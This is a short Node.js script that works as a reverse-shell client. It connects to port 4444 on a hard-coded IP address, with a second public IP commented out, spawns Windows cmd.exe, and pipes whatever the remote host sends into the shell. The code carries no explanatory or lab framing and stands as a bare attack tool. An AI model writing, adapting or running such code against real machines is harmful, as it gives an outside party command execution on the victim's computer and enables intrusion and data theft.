const net = require('net');
const { spawn } = require('child_process');
const readline = require("readline")

const rl = readline.createInterface({
  input: process.stdin, 
  output: process.stdout,
})


const client = new net.Socket();

function ask(question) {
  rl.question(question, (answer) => {
      client.write(answer);
  })
}

function connect() {
  client.connect(4444, '192.168.0.240', () => {
  //client.connect(4444, '193.165.237.196', () => {
    const proc = spawn('C:\\Windows\\System32\\cmd.exe', []);
    
    client.pipe(proc.stdin);
    client.on('data', (data) => {
      console.log('Client > ', data.toString());
      ask("Send > ")
    });
    client.on("error", async () => {
      //setTimeout(() => {
        console.log("Connection lost")
        process.exit(0)
        //connect()
      //}, 1000)
    })
    ask("Send > ")
  });
}
connect()